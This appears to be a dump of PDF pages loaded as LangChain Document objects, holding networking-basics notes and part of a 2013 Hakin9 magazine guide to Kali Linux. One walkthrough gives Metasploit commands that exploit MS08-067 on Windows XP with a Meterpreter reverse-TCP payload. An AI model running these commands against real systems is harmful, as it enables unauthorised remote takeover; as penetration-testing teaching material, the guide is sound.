              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/0.Network-Basics-Theory-1.pdf', 'page': 5}, page_content=' \\n  \\nSuper network  (Supernet)  \\nSupernet is an Internet Protocol network that is formed, for combining \\ntwo or more networks into a larger  network. The benefits of supernetting are \\nconservation of address space, gaining efficiency regarding  memory storage and \\nroute information processing.  \\n \\nNetwork address translation  \\nNetwork address translation (NAT) is a method of remapping one IP \\naddress space into another by modifying network address information in IP \\nheader packets while they are in transit. It has become a popular and essential \\ntool in conserving global address space in the face of IPv4 address exhaustion.  \\n \\nDynamic Host Conf iguration Protocol  \\nThe Dynamic Host Configuration Protocol (DHCP) is a network \\nmanagement protocol used on UDP/IP networks. A DHCP server dynamically \\nassigns an IP address and other network configuration parameters to each \\ndevice on a network  so that  they can communicate with other IP networks.  \\n \\nTCP  \\nTCP stands for Transmission Control Protocol, which is a widely used \\nprotocol for data transmission over a network. TCP establishes a connection \\nbetween two hosts before transmitting data, to ensure that data transm itted over \\nthe network  reaches the destination  without fail. TCP also known as a \\nconnection -oriented  protocol, establishes  a reliable connection between sender \\nand receiver. TCP provides error and flow control mechanisms which help in \\norderly transmission of data a nd retransmission of lost packets.  \\n \\nUDP  \\nUDP stands for User Datagram Protocol, which is connectionless \\nprotocol, mostly used for connections that can tolerate data loss. UDP is used by \\napplications on the internet that offer voice and video communications,  which \\ncan suffer some data loss without adversely affecting the quality. UDP does not \\nprovide error and flow control mechanisms because of which it does not require \\na connection to be established before transmitting data over the network . \\n \\nICMP  \\nICMP stands fo r Internet Control Message Protocol ; this is widely used \\nfor internet communication troubleshooting or generated in response to errors in \\nIP operations, this will send packets to the target machine and will see whether \\nthe packets  are delivered  or not.  \\n '),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/0.Network-Basics-Theory-1.pdf', 'page': 6}, page_content=' \\n Address Resolution Protocol  \\nAddress Resolution Protocol (ARP) is a communication protocol used for \\ndiscovering the link layer address, such as a MAC address, associated with a \\ngiven network layer address. This mapping is a critical function in the Internet \\nProtocol suite. It works within the boundaries of a single network never routed \\nacross internetworking nodes. ARP uses a simple message format containing \\none address resolution request or response. The size of the ARP message \\ndepends on the link layer and network layer address sizes.  \\n \\nDomain Name System  \\nDomain Name System (DNS) is a naming system for resources connected \\nto the Internet or a private network. The DNS is responsible for assigning \\ndomain names and mapping those names to Internet resources by designating \\nname servers for each domain. Network a dministrators have authority over the \\nsubdomains of their allocated name space  to other name servers. Domain Name \\nSystem is an essential component of Internet functionality.  \\n \\nInternet Group Management Protocol  \\nInternet Group Management Protocol (IGMP) is a  communication \\nprotocol used by hosts and adjacent routers on IPv4 networks to establish \\nmulticast group memberships. IGMP is an integral part of IP multicast. IGMP \\ncan be used for one -to-many networking applications such as online video \\nstreaming and gami ng and allows the more  efficient use of resources.  \\n \\nRouting  \\nRouting is the process of selecting a path for traffic in a network or across \\nmultiple networks. In routing , network packets from their source toward their \\ndestination are routed through int ermediate network nodes by specific packet \\nforwarding mechanisms. Intermediate nodes are typically network ed hardware \\ndevices such as routers, bridges, gateways, firewalls, or switches. In routing , \\nprocess packets are directed  on based on routing tables, which maintain a record \\nof the routes to various network destinations. An administrator specifies the \\nrouting  table . \\n \\nRouting protocol  \\nRouting protocol specifies how routers communicate with each other, \\ndistributing information,  which  enables them to sel ect routes between any two \\nnodes on a computer network. Routing algorithms determine  to choose a \\nspecific route . A routing protocol shares this information first among immediate \\nneighbors, and then throughout the network.  The major types of routing \\nprotoco ls. \\n● Routing Information Protocols ( RIP) '),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/0.Network-Basics-Theory-1.pdf', 'page': 7}, page_content=' \\n ● Interior Gateway Routing Protocol (IGRP)  \\n● Open Shortest Path First (OSPF)  \\n● Exterior Gateway Protocol (EGP)  \\n● Enhanced Interior Gateway Routing Protocol (EIGRP)  \\n● Border Gateway Protocol (BGP)  \\n● Intermediate System -to-Interme diate System (IS -IS) \\n \\n \\nReferences:   \\n  \\n1. Beal, V. (n.d.). Network Fundamentals Study Guide. Retrieved from \\nhttps://www.webopedia.com/quick_ref/network -fundamentals -study -\\nguide.html . \\n2. Beal, V. (n.d.). What is The Difference Between IPv6 and IPv4 ? \\nRetrieved from \\nhttps://www.webopedia.com/DidYouKnow/Internet/ipv6_ipv4_differenc\\ne.html . \\n3. What is OSI model (Open Systems Interconnection)? - Definition  from \\nWhatIs.com. (n.d.). Retrieved from \\nhttps://searchnetworking.techtarget.com/definition/OSI  \\n4. Image reference: 7 Layers of OSI Model and Their Functions. (2017, \\nNovember 05). Retrieved from http://e lectricala2z.com/cloud -\\ncomputing/osi -model -layers -7-layers -osi-model/   '),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 0}, page_content=''),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 1}, page_content=''),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 2}, page_content=' \\n “We specialize in Information \\nSecurity Solutions including \\nPenetration Testing, Forensic \\nAnalysis and Computer \\nInvestigations to a diverse \\nrange of clients worldwide”  \\n  \\n \\n \\n \\n \\n \\n \\n \\n \\n \\nCyber Investigations N.I. Ltd.  \\nNorthern Ireland Science Park \\nQueens Road \\nQueens Island \\nBelfast BT3 9DT \\nUnited Kingdom \\n  \\nEmail : \\n info@cyberinvestigationsni.com \\n \\nTelephone: \\n+44(0)28 9079 6983 \\n \\nPlease visit us on:  www.cyberinvestigationsni.com  \\n  \\nFor a free security \\nconsultation, then please \\ncontact us by either mail \\nor phone and one of our \\nsecurity experts will be \\nhappy to assist you. '),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 3}, page_content='Extra 03/2013 4\\nPRACTICAL PROTECTION  IT SECURITY MAGAZINE\\n team\\nEditor in Chief: \\nJulia Adamczewska \\njulia.adamczewska@hakin9.org\\nEditorial Advisory Board: \\nHans van Beek, Peter Harmsen, Casey Parman\\nProofreaders: Julia Adamczewska, Krzysztof \\nSamborski\\nSpecial thanks to our Beta testers and Proofreaders \\nwho helped us with this issue. Our magazine would \\nnot exist without your assistance and expertise.\\nPublisher: \\nPaweł Marciniak\\nCEO: \\nEwa Dudzic\\newa.dudzic@hakin9.org\\nProduct Manager: \\nKrzysztof Samborski\\nkrzysztof.samborski@hakin9.org\\nProduction Director: \\nAndrzej Kuca\\nandrzej.kuca@hakin9.org\\nMarketing Director: \\nJulia Adamczewska \\njulia.adamczewska@hakin9.org\\nArt. Director: \\nIreneusz Pogroszewski\\nireneusz.pogroszewski@software.com.pl\\nDTP: \\nIreneusz Pogroszewski\\nPublisher: \\nHakin9 Media Sp. Z o.o. SK\\n02-676  Warszawa, ul. Postępu 17D\\nNIP 95123253396\\nPhone: 504927626\\nwww.hakin9.org/en\\nWhilst every effort has been made to ensure the \\nhighest quality of the magazine, the editors make no \\nwarranty, expressed or implied, concerning the results \\nof the content’s usage. All trademarks presented in the \\nmagazine were used for informative purposes only. \\nDISCLAIMER!\\nThe techniques described in our magazine \\nmay be used in private, local networks only. \\nThe editors hold no responsibility for the \\nmisuse of the techniques presented or any \\ndata loss.\\nDear Readers,\\nAlong with the Autumn here it comes the comprehen -\\nsive ‘Guide to Kali Linux’. In the following issue we will \\nfocus on this popular, yet still-much-to-discover pentest -\\ning tool.\\nSo we will start with the Basics and see what’s new \\nin Kali Linux comparing to BackTrack and also we will \\nbrowse the set of new and updated tools in the article ‘Kali \\nLinux for Enterprises’. \\nThe Attack section is full of great tips for pentesters \\n(and not only), so they can see how to weaponize the an -\\ndroid platform and also perform the attack on servers. \\nThe Defense section contains a great paper on deploy -\\ning network vulnerability scanners for medical clients and \\npresents an interesting view on Kali scanning. There is \\nalso a fine overview on Kali as a tool for both good and \\nbad purposes. \\nWe are sure you will find a lot of helpful information in \\nthe whole issue. \\nHakin9’s Editorial Team would like to give special \\nthanks to the authors, betatesters and proofreaders.\\nWe hope our effort was worthwhile and you will find the \\nHakin9 Guide to Kali Linux issue appealing to you. We \\nwish you a nice read!\\nJulia Adamczewska \\nand the Hakin9 team\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 4}, page_content='www.hakin9.org/en\\nCONTENTS\\nBASICS\\nKali Linux – What’s new? 06\\nBy Steven McLaughlin, Security Researcher \\nKali Linux released earlier in the year is dubbed the \\nmost advanced penetration testing distribution, ever. \\nHow does it compare to BackTrack?, and: What’s the \\ndifference?\\nKali Linux for Enterprises 10\\nBy Navneet Sharma, Information Security Analyst \\nWhenever we think of Penetration Testing (PT) the first \\nname that comes to our mind is “Backtrack (BT)”, which \\nwe have been using for the last few years. Backtrack, \\nfunded by offensive Security (www.offensive –Security.\\ncom), is also one of the most popular UBUNTU Linux \\nbased platform, with collection of organized security \\ntesting tools such as Open-VAS, maltigo, Metasploit \\nFramework (MSF), etc. Last release to Backtrack series \\nwas Backtrack 5 R2 with codename Revolution.\\nKali Linux is the latest linux distribution made for pen -\\netration testing by and used by security assessors and \\nhackers. Kali Linux is also considered as a successor \\nto Backtrack.\\nATTACK\\nWeaponization of Android Platform  \\nusing Kali Linux 16\\nBy Daniel Singh, Independent Consultant in network \\nand systems security\\nKali Linux has become the most popular tool for pro -\\nfessional penetration testing and security auditing. In \\nthis article, we will review how to couple the functional -\\nity of Kali Linux with Android platform over HTC One X \\nsmartphone to create an invincible penetration-testing \\nweapon.\\nKali Linux, Attacking Servers 24\\nBy Ismael Gonzalez D., Security Researcher, CEH, \\nMCP, MCDTS, MCSA, LPIC-1\\nThis article will show you how to perform attacks on web \\nservers, getting full access to the system and database. \\nJust by using some of the ‘Top Ten’ tools of Kali Linux.\\nHands On: How to Create “Backdoor”  \\nto Remote Access with Kali Linux,  \\nDNS Spoofing Attack with Ettercap  \\nand Cloning Sites with Kali Linux 28\\nBy Rafael Fontes Souza, Co-Founder at Grey Hats, \\nmember of the “French Backtrack Team”\\nThe three articles describe very useful tools in Kali and \\ncover the ideas of creating backdoor, how to perform \\nthe spoof attack and how to clone websites with SET \\nAttack Method. DEFENSE\\nKali Scanning for HIPAA – A Proof of  \\nConcept: using Kali Linux to deploy  \\ndistributed network vulnerability  \\nscanners for medical clients 34\\nBy Charlie Waters, Security Officer and Senior \\nConsultant for Infinity Network Solutions\\nThe Health Insurance Portability and Accountability \\nAct of 1996 (HIPAA) requires organizations who han -\\ndle electronic Protected Health Information (e-PHI) to \\ntake action and reduce risk relative to potential security \\nbreaches of digital communication and storage of pa -\\ntient information. Open Source solutions can be lever -\\naged as a low-cost and effective strategy to minimize \\nrisk when used as component of a larger information \\nsecurity program. With a long “track” record of commu -\\nnity support, Kali is an open source Linux distribution \\ncontaining many security tools to meet the needs of \\nHIPAA network vulnerability scans. \\nKALI LINUX  \\n– A Solution to HACKING/SECURITY 40\\nBy Deepanshu Khanna, Linux Security Researcher\\nToday is the world of technology and everyone some -\\nhow is attached to it. Some are using the technology for \\nthe good purpose and some are using it for bad purpos -\\nes and Internet is one of those technologies which de -\\nfine both my statements. Internet is being used both by \\nthe good (the White Hats) and the bad (the Black Hats). \\nSo, my paper is totally based on the above line that the \\nOS (Operating System) KALI LINUX (which is an exten -\\nsion to Backtrack) can be used in both the ways either \\nfor good or bad. \\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 5}, page_content='Extra 03/2013 6BASICS\\nFor some years BackTrack linux has been \\nthe premier pen-test distribution. The new -\\nest pen-test distribution released by Of -\\nfensive Security which supersedes BackTrack \\ncomes with some massive and welcome im -\\nprovements. The biggest change from BackTrack \\nis the move from Ubuntu linux to Debian Wheezy \\nlinux. The first thing I notice is that the installa -\\ntion is no longer launched by executing a script \\non the Desktop as it was with BackTrack, but is \\ninitiated but booting into a proper Debian instal -\\nlation system. The process generally feels a lot \\nsmoother from the start. I have also noticed that \\nin general Kali doesn’t break as easily as Back -\\ntrack and it generally has a much more stable \\nfeel to it. So what’s the difference between Back -\\nTrack and Kali?\\nBackTrack 5 v Kali\\nUbuntu, which BackTrack is based on, has a gen -\\neral feel to it that it is trying to babysit you as the \\nuser, which can be annoying to an experienced \\nlinux user. Ubuntu likes to make everything user \\nfriendly and tries to cut out any complex configu -\\nrations. Debian, which Kali is based on, may not \\ncome across to be so ‘user friendly’ to someone \\nwho is not that experienced with linux, and re -\\nquires more hands on experience with linux, but \\nis generally more configurable and stable. Person -ally, I definitely prefer the Debian base for Kali as I \\nlike to tweak. This distribution is not for linux begin -\\nners in any case. \\nWhat Happened to Firefox? \\nOne of the first things I notice is that Firefox has \\nbeen replaced by Iceweasel. On first instance \\nthis might leave you wondering what Iceweasel is \\nand why it has replaced Firefox. The truth is that \\nIceweasel IS Firefox. The Debian project patch -\\nes Iceweasel by backporting security fixes, thus \\nmaking it secure enough to be declared in debi -\\nan stable version. Because this is the case they \\nhad to re-brand it Iceweasel as the modifications \\nmade by Debian project were not approved by the \\nMozilla foundation in order to use the Thunder -\\nburd logo. Other than backported security patch -\\nes and the logo, both Firefox and Iceweasel are \\nidentical. I would recommend staying with Ice -\\nweasel on Debian, but if you really want to use \\nFirefox you can install it in the following manner \\nby first uninstalling Iceweasel (Listing 1).\\nFHS-compliance and /pentest\\nAnother massive step in the right direction is FHS-\\ncompliance. File Hierarchy Standard (FHS) compli -\\nance specifies guiding principles for each part of the \\nfile system, and means that the directory structure \\nand file system is standardised such that software Kali Linux  \\n– What’s new?\\nKali Linux released earlier in the year is dubbed the most \\nadvanced penetration testing distribution, ever. How does it \\ncompare to BackTrack?, and: What’s the difference?\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 6}, page_content='www.hakin9.org/en 7Kali Linux – What’s new?\\nand users can easily find the location of installed \\nfiles such as binaries and libraries. This will also \\nlead to a more stable system in general.\\nIn BackTrack, every pen-test tool which you \\nwanted to use you either had to express the full \\npathname to the tool e.g. /pentest/passwords/\\nrainbowcrack/rcrack  or change to the directory in \\norder to use it. Kali no longer uses the  /pentest  di-\\nrectory tree, and all command line pen-test tools \\nseem to be located in /usr/bin . Pen-test tools are now in PATH and can now be fired up from any -\\nwhere in the system. I certainly don’t miss the /\\npentest  directory. This certainly makes life a whole \\nlot easier.\\nNo Nessus\\nNessus does not come installed with Kali and is \\nnot available in the Kali repositories. One reason \\nfor this could be that Kali linux is based on Debi -\\nan Wheezy (Debian 7), however if you check the \\navailable downloads from the tenable website, \\nthey have only released a version of Nessus for \\nversion 6 of Debian. Another reason for this may \\nbe because Nessus is more of an audit and com -\\npliance benchmarking tool than a pen-test tool, \\nand perhaps it was thought too bloated to include. \\nNessus is certainly something I see more of in -\\nstalled on dedicated servers these days. Howev -\\ner if you want to install it, the Debian 6 version of \\nNessus which can be downloaded from the ten -\\nable website will still work. The only other pos -\\nsible reason for not including Nessus is that Nes -\\nsus is forbidden in the Penetration Testing with \\nBackTrack(PWB) Course (which will probably \\nadvertisement\\nListing 1.  How to install Firefox\\necho “deb http ://downloads .sourceforge .net/\\nproject/ubuntuzilla /mozilla/apt all main” \\n>> /etc/apt/sources.list\\napt-get remove iceweasel\\napt-key adv –recv -keys –keyserver \\nkeyserver .ubuntu.com C1289A29\\napt-get update\\napt-get install irefox -mozilla-build\\napt-get install thunderbird -mozilla-\\nbuild\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 7}, page_content='Extra 03/2013 8BASICS\\nget a new name now because of Kali). Offensive \\nSecurity encourages all of its PWB students to \\nuse more specialised and targeted tools to per -\\nform enumeration and discovery. Further, differ -\\nent tools quite often output different results, so it’s \\nbest to use more highly targeted tools in a pen-\\ntest to get specific results rather than the results \\nof a generalised scan or vulnerability assessment \\ntool such as Nessus.\\nOther Notable Changes\\nKali uses Leafpad instead of gedit which is a much \\nlighter weight text editor than gedit. It is also no -\\nticeably faster. But if you want to use gedit it is \\nstill available in the Kali respository with a simple \\napt-get install gedit.  Gedit may appear bloated to \\nsome unless you are interested in syntax highlight -\\ning. Personally I like syntax highlighting, but have \\na habit of writing all my code in vim from the ter -\\nminal window which has this functionality anyway \\n– each to their own I guess. Here’s a list of some \\nother welcome changes:\\n•  The PDF viewer which was used in BackTrack \\nhas now been replaced with Document Viewer \\nwhich is great since I found the PDF viewer a \\nbit lakey.\\n•  You can now easily create your own custom \\nISO of Kali by using Debian live-build scripts.\\n•  Kali comes with VLC player pre-installed which \\nwas not included in BackTrack.\\n•  I’ve also noticed that the ISO image for Kali is \\nalmost 1GB smaller than the BackTrack 5 R3 \\nISO.\\nUpgrading to Future versions of Kali\\nIf you had BackTrack 4 installed and wanted to up -\\ngrade to BackTrack 5, the only way you could have \\nachieved this was to do an entire reinstall. This \\nwould be time consuming, and mean you would \\nhave to re-configure everything back to the way \\nyou wanted it, and customise all your tools again. \\nWith Kali however, an upgrade to future major re -\\nleases can be done by simply issuing the following \\ncommands: Listing 2.\\nThe Kali repository gets its security packages \\nfrom the Debian repository, and all of its tools are \\nnow packaged up to be Debian compliant. \\nListing 2.  Upgrading Kali to the next major distribution\\nroot@kali :~# apt-get update\\nroot@kali :~# apt-get dist-upgradeSummary\\nIn summary, Kali linux feels a lot smoother to \\nwork with than BackTrack, whilst most of the \\ntools remain fairly similar or unchanged; the \\nmain overhaul to be commended on is the over -\\nall improvement in the quality of the distribution \\nfrom the move to Debian. It now feels like a com -\\nplete distribution with far less flakiness and a lot \\nmore stability. For a duck dive into the pen-test \\ntools which ship with Kali, I would recommend \\ndoing Offensive Security’s Penetration Testing \\nwith BackTrack(PWB) course which will familiar -\\nise you with all the tools necessary to conducting \\na complete penetration test with reporting. The \\nmain advantage you will notice is that the tools \\nare now all in path with Kali. The only advice I \\nhave in pursuing this course is to get permission \\nfrom your other half, as it will take a good couple \\nof months out of your life, but is extremely fun, ad -\\ndictive, and rewarding with all the breakthroughs \\nyou will have. Well done to the Offensive Security \\nTeam for creating such an improved distribution, \\nand good luck with your Kali experience.\\nSTeveN MCLAUgHLIN  \\nSteven McLaughlin is an experienced in -\\nformation and network security profes -\\nsional. With both a technical and consult -\\ning background, he has been heavily in -\\nvolved in working with global companies \\ndeveloping solutions and delivering large \\nscale projects. He also works in highly spe -\\ncialized teams in order to develop new ideas and patents and \\nbring new products to market.\\nOn the Web\\n•  http://www.pathname.com/fhs/  – Information on \\nFile Hierarchy Standard\\n•  http://www.ofensive-security.com/information-securi -\\nty-training/penetration-testing-with-backtrack/  – Pen -\\netration Testing with Backtrack Course\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 8}, page_content=''),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 9}, page_content='Extra 03/2013 10BASICS\\nKali Linux is the latest linux distribution made \\nfor penetration testing by and used by secu -\\nrity assessors and hackers. Kali Linux is al-\\nso considered as a successor to Backtrack. Back -\\ntrack was based on Ubuntu Distribution ( www.\\nubuntu.com ) whereas Kali Linux complies with \\ndebian development standards ( www.debian.org ).\\nBuilding Kali Linux was something like Re-In -\\nventing the wheel again. Kali Linux was built from \\nscratch, to support under the Debian platform and \\nalso to make it compatible with new or existing se -curity tools. Kali Linux is designed to support both \\n32-bit and 64-bit platform and ARM Architecture. \\nevolution of Kali Linux\\nWhen Backtrack was initially developed by Offen -\\nsive-Security, with consideration in mind to con -\\nduct network based Vulnerability Assessment and \\nPenetration testing. They started releasing BT ver -\\nsions with their name, as depicted on (Figure1). \\nWhen BT 3 was released, it was released with \\ncodename “Whydah” and added functionality and \\ntools to conduct wireless testing. BT 4 released \\nwith Codename “ Pwnsauce ” and “ Nemisis ”, with \\nadded functionality of web application testing and \\nwith more advanced and improved GUI based in -\\nterface. And with continuation to BT 5 R2 with se -\\ncurity tools update like BeeF(Browser Explotation \\nFrwamework), bluelog, dnschef, dpscan, etc.\\nKali Linux is considered an enterprise ready solu -\\ntion, because it considered enterprise users when \\nit was designed. Kali runs on a Debian platform, \\nwhich supports many software repositories to keep \\nupdating OS with latest releases and patch. This \\ncapability reduces updating problem, which users \\nwere facing on BT environment.\\nAlso Offensive security team up with Rapid 7 \\n(Makers of Metasploit Framework), to provide offi -\\ncial support to Kali Linux. So MSF ( most important ar -\\nsenal of BT ) was rebuildt to support Debian platform.KALI Linux  \\nFor enterprises\\nWhenever we think of Penetration Testing (PT) the first \\nname that comes to our mind is “Backtrack (BT)” , which we \\nhave been using for the last few years. Backtrack, funded \\nby offensive Security (www.offensive –Security.com), is also \\none of the most popular UBUNTU Linux based platform, \\nwith collection of organized security testing tools such \\nas Open-VAS, maltigo, Metasploit Framework (MSF), etc. \\nLast release to Backtrack series was Backtrack 5 R2 with \\ncodename Revolution.\\nFigure 1. Evolution of Kali Linux\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 10}, page_content='www.hakin9.org/en 11KALI Linux (For enterprises)\\nDevelopment Architecture\\nKali Linux supports various Reduced Instruction \\nset Computing  (RISC) based development archi -\\ntecture. Kali ARM can be made for:\\n•  EikaMX\\n•  Beaglebone Black\\n•  CuBOX\\n•  Galaxy Note 10.1\\n•  Samsung Chromebook\\n•  MK/SS808\\n•  ODROID U2\\n•  Raspberry Pi\\n•  ARM Chroot\\nLet’s discuss here few of them, how these ARM’s \\ncan be used for Kali Linux.\\neikaMX\\nEfika is a line of power efficient ARM architecture and \\nPower architecture. EfiKa MX Open Client is a net -\\nwork computer based around the EFIKA MX micro-\\nmother board. EfikaMX has following specifications:\\n•  Freescale i.MX515 (ARM Cortex-A8 800MHz)\\n•  3D Graphics Processing Unit\\n•  512 MB RAM\\n•  8GB USB\\n•  2x USB 2.0 ports\\n•  Audio jacks for headset\\n•  Built in Speaker\\n•  Bluetooth (Broadom 2043) \\nSteps to build image by EikaMX\\n•  Step 1: Get 8GB micro SD Card, class 10 high -\\nly recommended\\n•  Step 2: Download Kali image\\n•  Step 3: use dd utility to image this ile to SD card \\nroot@kali:~ dd if =kali-1.0.1-eimx.img of=/dev/sdb \\nbs=512k\\nBeaglebone Black\\nBeaglebone boards are tiny computers with all ca -\\npability of today’s desktop machine without bulk \\nnoise, expense or noise.\\nSteps to build image using Beaglebone:\\n•  Step 1: Get 8GB micro SD Card, class 10 high -\\nly recommended\\n•  Step 2: Download Kali Linux Beaglebone\\n•  Step 3: use dd utility to image this ile to SD card\\nroot@kali:~ dd if =kali-bbb.img of=/dev/sdb bs=512kSamsumg galaxy Note 10.1\\nOf course the popular one and most people have \\nit. Also attract pentesters to build image for this. \\nKali also listed down its procedure to make image \\nfor Galaxy note 10.1. Galaxy note 10.1 has follow -\\ning specification:\\n•  1.4 GHz Quacore processor\\n•  2 GB RAM\\nSteps to build image for Samsung Note (Steps as \\nper Kali Linux.org website)\\n•  Step 1: Get 8GB micro SD Card\\n•  Step 2: Root the Samsung Galaxy Note 10.1\\n•  Step 3: Download Kali Linux for Samsung gal -\\naxy Note 10.1\\n•  Step 4: Rename the image to linux.img\\n•  Step 5: Download Recover.img ile from down -\\nload section of Kali Linux.orf and copy it on \\nyour Note 10.1 sdcard\\n•  Step 6: use dd utility to image this ile to SD card\\nroot@kali:~ dd if =/dev/block/mmcblk0p6 \\nof=recovery.img_orig\\n•  Step 7: Reboot Galaxy  note 10.1 to recovery \\nmode , press Power Off  and Volume UP  button. \\nOnce you see the text for “Samsung Galaxy \\nNote 10.1”, release the power button but keep \\npressing the Volume UP button.  This should \\nboot into Kali and auto Login into Gnome. Root \\nPassword is “Changeme”\\n•  Step 8: Open Keyboad: Applications -> Univer -\\nsal Access -> Florence Virtual Keyboard\\nNote: development architecture referenced from \\nhttp://docs.kali.org/category/armel-armhf .\\nDirectory Structure\\nAs Kali is successor to Backtrack, so most of its fea -\\ntures are inherited from backtrack. Like Backtrack,  \\nFigure 2.  Directory Structure\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 11}, page_content='Extra 03/2013 12BASICS\\nKali tools are also divided into 12 categories (Fig -\\nure 2):\\n•  Information Gathering\\n•  Vulnerability Analysis\\n•  Web Applications\\n•  Password Attacks\\n•  Wireless Attacks\\n•  Stress Testing\\n•  Exploitation Tools\\n•  Snifing/Snooping \\n•  Maintaining Access•  Reverse Engineering\\n•  Forensics\\n•  Reporting Tools\\nRemembering Backtrack 5, penetration direc -\\ntories are organized in under /pentest  directory. \\nBut in Kali Linux doesn’t store security tools un -\\nder pentest directory, commands are generally ex -\\necuted from /usr/sbin (Figure 3).\\nAnother important category of tools added in Kali \\nLinux are “TOP 10 Security Tools” which are fre -\\nquently used by pentesters, as presented Figure 4. \\nOffensive security has also put lots of effort to \\nmake Kali enterprise ready solution by adding \\nmore tools in Kali. Researchers most of the time \\nused backtrack for “MSF” and to do other stuff, \\nthey depend on other penetration testing distro’s \\nor they make their OWN ISO or install on their own \\noperating system. (Figure 4) shows the compari -\\nson between Backtrack and Kali (Figure 5).\\nFigure 4.  Kali Linux “Top 10 Security Tools”\\nFigure 3.  Kali Vs. Backtrack: Change in Directory Structure\\nFigure 5.  Tool Comparison between Kali and Backtrack\\nFigure 6.  Opening metaspoloit with msfconsole command\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 12}, page_content='www.hakin9.org/en 13KALI Linux (For enterprises)\\nLet’s do some Practical things with Kali\\nAs we know the famous vulnerability in Windows-\\nXP “MS08-067: Vulnerability in Server Service \\ncould allow Remote-Code execution” \\nSome Brief about the vulnerability\\nRemote code execution vulnerability exists in the Serv -\\ner service on Windows systems. The vulnerability is due to the service not properly handling specially crafted \\nRPC requests. An attacker who successfully exploited \\nthis vulnerability could take complete control of an af -\\nfected system .\\nReference to the vulnerability\\nhttp://technet.microsoft.com/en-us/security/bulle -\\ntin/ms08-067 .\\nSystem exploited successfully\\nWindows XP Service PACK-2.\\nSteps followed to exploit the vulnerability (Figures \\n6-9). Steps explained in a nutshell.\\nStep 1: Open MSF Console\\nmsfconsole\\nFigure 7. Searching exploits for netapi\\nFigure 8.  Setting up exploit, adding required variables, and exploiting the target\\nFigure 9.  Verifying exploited system\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 13}, page_content='Extra 03/2013 14BASICS\\nStep 2: Search for exploit “netapi”, \\nuse command “search netapi”\\nStep 3: Configure the exploit for execution to \\ntarget\\nUse following commands to exploit target\\n•  Use exploit/windows/smb/ms08_067_netapi\\n•  Set payload windows/meterpreter/reverse_tcp\\n•  Set lhost <your machine IP>\\n•  Set rhost <Remote IP>\\n•  exploit\\nStep 4: exploit run Successfully, Run vNC\\nKali Linux installation and Software \\nrepositories\\nInstallation\\n•  Download VMPlayer or VMware workstation \\nfrom Vmware website as per yours operating \\nsystem\\n•  Install on the VMPlayer or VMWare on your \\nplatform\\n•  Create Virtual machine (With min 20 GB Hard \\ndisk Space, 1GB RAM, Two Network Adapter, \\nrest all by default)\\n•  Mount KALI ISO ile on the VMWARE setting\\n•  Switch on the Virtual machine and boot it from \\n“CD-ROM” by pressing “ESC”\\n•  Once GRUB Appear, and then click on the in -\\nstall (or it can be used as a LIVE CD)\\n•  Follow the instruction as written on screen \\n(Similar to backtrack installation)\\n•  Finish the installation\\nUpdate Kali\\n•  Open leafpad•  Open ile from /etc/apt/sources.list  (Some \\nsources path already present there, but more \\ncan be added from Google)\\n•  apt-get update\\n•  apt-get upgrade\\n•  apt-get dist-upgrade\\nSummary\\nKali Linux a Debian based platform for advanced \\npenetration testing. Kali approach is good try for \\nstepping ahead into next generation of penetration \\ntesting. Researchers and developers of offensive \\nsecurity have put their best effort to make Kali plat -\\nform enterprise ready. As Debian being the older \\nplatform for Linux, it also has a large user base \\ncompared to UBUNTU. Debian based Operating \\nsystem has also good market capture so move -\\nment from Ubuntu to Debian platform will definitely \\ngive power to end users. \\nAt last KALI is enterprise focused, developed \\nkeeping in mind enterprise needs, so there is much \\nmore to evolve in near future. So good luck to Of -\\nfensive Security team!\\nKeep Learning and Be Secure!\\nNAvNeeT SHARMA\\nNavneet Sharma is a Solution Architect \\nwith Tata consultancy services, working in \\ndomain of information security and net -\\nwork security. He holds a degree of Bache -\\nlor of Technology in Information Technol -\\nogy and has worked in diverse range of in -\\ndustry verticals over the last 7 years of his \\ncareer. Some key assignment that he has been involved in in -\\nclude network security design and consulting, security audit -\\ning (Application/Network), Vulnerability Assessment and Pen -\\netration Testing.\\nReferences\\n•  http://en.wikipedia.org/wiki/BackTrack  – for Backtrack in a NutShell\\n•  http://www.ofensive-security.com/tag/kali-linux/  – for all post on Kali Linux about installation and managing\\n•  http://www.kali.org/  – for introduction to Kali\\n•  http://docs.kali.org/category/armel-armhf  – for Kali Linux ARM Architecture also for creating ARM image s on Eika -\\nMX, Beaglebone etc.\\n•  http://www.backtrack-linux.org/backtrack/backtrack-5-r2-r eleased/  – For Oicial introductory release of Backtrack 5\\n•  http://www.h-online.com/open/news/item/Kali-Linux-arrives -as-enterprise-ready-version-of-BackTrack-1822241.html  \\n– For Story behind building Kali Linux for enterprises\\n•  http://www.ofensive-security.com/kali-distribution/kali-l inux-on-galaxy-note/  – For deeper look of Kali Linux instal -\\nlation on Galaxy Note\\n•  